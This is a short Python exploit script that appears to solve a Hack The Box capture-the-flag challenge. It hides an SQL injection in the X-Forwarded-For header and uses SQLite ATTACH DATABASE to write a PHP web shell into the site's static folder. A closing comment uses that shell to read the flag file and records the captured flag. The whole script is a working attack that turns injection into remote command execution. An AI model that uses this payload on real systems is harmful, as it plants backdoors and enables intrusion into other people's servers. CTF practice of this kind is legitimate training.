import requests

data = {
	"email" : "test@gmail.com"
}

header = {
	"X-Forwarded-For" : "127.0.0.1','a@gmail.com') ;ATTACH DATABASE '/www/static/index.php' AS test ; create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('<?php system($_GET[\"cmd\"]);?>') ; -- -"
}
res = requests.post("http://138.68.161.126:30133/subscribe",data=data,headers=header,allow_redirects=False)

print(res.headers['Location'])
print(res.text)

# http://138.68.161.126:30133/static/index.php?cmd=cat%20/flag*
# HTB{inj3ct3d_th3_tru7h}